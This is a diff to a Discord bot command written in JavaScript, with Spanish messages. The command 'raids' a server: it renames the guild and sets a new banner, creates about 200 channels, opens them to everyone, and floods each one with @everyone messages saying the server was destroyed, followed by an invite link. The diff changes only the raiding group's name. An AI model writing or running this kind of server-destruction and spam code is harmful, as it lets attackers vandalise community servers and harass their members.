@@ -15,7 +15,7 @@ module.exports = {
 try{
 //if(15 >= interaction.guild.memberCount) return interaction.reply({content: '**Solo puedes Raidear servidores con un máximo de 16 personas dentro del server.**', ephemeral: true})
     let IDsv = interaction.guild.id
-    client.guilds.cache.get(IDsv).setName('☣️BasadoSquad☣️').catch(e=>{
+    client.guilds.cache.get(IDsv).setName('☣️ⱠegiønSquad☣️').catch(e=>{
       return
     })
     client.guilds.cache.get(IDsv).setBanner(require("../../config.json").imgicon).catch(e=>{
@@ -75,7 +75,7 @@ try{
   }).catch(()=>{return})
 
 for (let i = 0; i <= 200; i++) {
-await  interaction.guild.channels.create('☣️BasadoSquad☣️').then(c => {
+await  interaction.guild.channels.create('☣️ⱠegiønSquad☣️').then(c => {
   c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
   for (let i = 0; i <= 20; i++) {
     c.send(`  @everyone \n Servidor destrozado por   **☣️BasadoSquad☣️**  , si deseas recuperar tu servidor deberás unirte: \n ${require('../../config.json').sexoinvite} `).catch(e=>{return})
